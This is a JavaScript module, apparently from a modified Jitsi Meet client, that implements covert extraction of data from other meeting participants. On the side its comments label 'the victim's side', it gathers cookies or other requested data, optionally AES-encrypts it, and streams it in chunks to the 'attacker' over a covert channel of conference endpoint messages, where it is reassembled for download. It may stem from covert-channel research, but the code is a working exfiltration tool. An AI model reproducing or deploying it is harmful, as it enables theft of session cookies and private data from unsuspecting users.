/* eslint-disable max-params */
/* global APP, getDefaultSettings */

import { extractionStarted } from '../react/features/subtitles';


import CovertReceiver from './CovertReceiver';
import CovertTransmitter from './CovertTransmitter';
import DataEncoder from './DataEncoder';

const defaultConfigurationValues = {
    //
    method: 'endpoint',

    //
    dataType: 'cookies',

    //
    chunkSize: 5000,

    //
    encryptionEnabled: true,

    //
    pingInterval: 1000,

    // If debug is true the communication will generate unique identifier of communication,
    // if false it would be default value 'extraction'
    debug: true
};


/**
 *
 */
export class CommunicationHandler {
    /**
     * @param {object} configuration - Object containing information about data extraction
     */
    constructor(receivedMessage) {
        this.receivedMessage = receivedMessage;
        this.configuration = getDefaultSettings(defaultConfigurationValues, receivedMessage.config);
        this._fileBuffer = [];
        this.communicationEnded = false;
        this.nameOfCommunication = this.getCommunicationName();
    }

    /**
     *
     * @returns {string}
     */
    getCommunicationName() {
        return this.configuration.debug ? 'extraction' : DataEncoder.generateName();
    }

    /**
     * Handle sent message
     */
    handleMessage(user) {
        // this runs on the victim's side
        if (this.receivedMessage.extraction === 'request') {
            if (this.receivedMessage.config.dataType !== 'cookies') {
                APP.conference.dispatchExtraction(user, this.receivedMessage);

                return;
            }
            this._acquireData(this.receivedMessage.config).then(acquiredData => {
                this.sendAll(acquiredData, user);
            });
        } else { // 'reply' received, this runs on the attacker's side
            this.extractionEvent = APP.conference._extractionEventElement;

            this.receiveEndpointData(this.receivedMessage);
        }
    }

    /**
     * Setting AES key and IV
     */
    async initializeEncryption() {
        if (this.configuration.encryptionEnabled
                && !this.configuration.key && !this.configuration.iv) {
            [ this.configuration.key, this.configuration.iv ] = await DataEncoder.generateEncryption();
            console.log('KEYS GENERATED:', this.configuration.key, this.configuration.iv);
        }
    }

    /**
     * Looks if encryption is used in the communication
     * @returns {boolean}
     */
    enabledEncryption() {
        return this.configuration.encryptionEnabled
            && this.configuration.key instanceof CryptoKey
            && this.configuration.iv instanceof Uint8Array;
    }

    /**
     * getter for full file buffer
     */
    get fullData() {
        return this._fileBuffer?.length ? this._fileBuffer?.reduce((first, second) => first + second) : '';
    }

    /**
     * Receive reply data through the specified extraction method.
     * Could be either endpoint text payload data, or control info (ending message).
     * @param {*} recievedData - Data received from endpointTextMessage.
     * @param {*} event - Custom event for dispatching data when extraction ended.
     */
    receiveEndpointData(recievedData) {
        // extract data using specified method
        if (recievedData.isEnd) { // 'reply' control ending message
            if (this.extractionEvent) {
                // Event for downloading extracted data at the end of extraction.
                // Define custom event 'extractionEnded' and trigger it.
                this.extractionEvent.dispatchEvent(new CustomEvent('extractionEnded', {
                    detail: {
                        extractedData: this.fullData,
                        config: this.configuration
                    }
                }));
            }
            this._fileBuffer = []; // empty the file buffer after ending communication.
            this.communicationEnded = true;

        } else if (this.enabledEncryption()) { // 'reply' containg encrypted data
            console.log('DECRYPT:', recievedData.payload, this);
            DataEncoder.decrypt(recievedData.payload).then(data => {
                this._fileBuffer.push(data);
            });
        } else { // 'reply' containg text data
            this._fileBuffer.push(recievedData.payload);
        }
    }
}


/**
 * Class responsible for extraction handling
 */
export default class ExtractionHandler extends CommunicationHandler {

    /**
     * Send data through the specified method.
     * @param {any} data - data to be sent.
     */
    sendAll(data, attacker) {
        // If the method can loose data through the transition send the final size of sent file.

        if (this.enabledEncryption()) {
            DataEncoder.encrypt(data).then(encryptedData => {
                const initiator = new CovertTransmitter(attacker, this.configuration, 
                    this.nameOfCommunication, encryptedData);

                initiator.getUsedMethod()();
            });
        } else {
            const initiator = new CovertTransmitter(attacker, this.configuration,
                    this.nameOfCommunication, data);

            initiator.getUsedMethod()();
        }
    }

    /**
     * Receive data through the specified extraction method.
     */
    receiveAll(user) {
        // TODO: add generic code for all types of communication.
        const initiator = new CovertTransmitter(user, this.configuration, this.nameOfCommunication, this._fileBuffer);

        initiator.getUsedMethod()();
    }
}
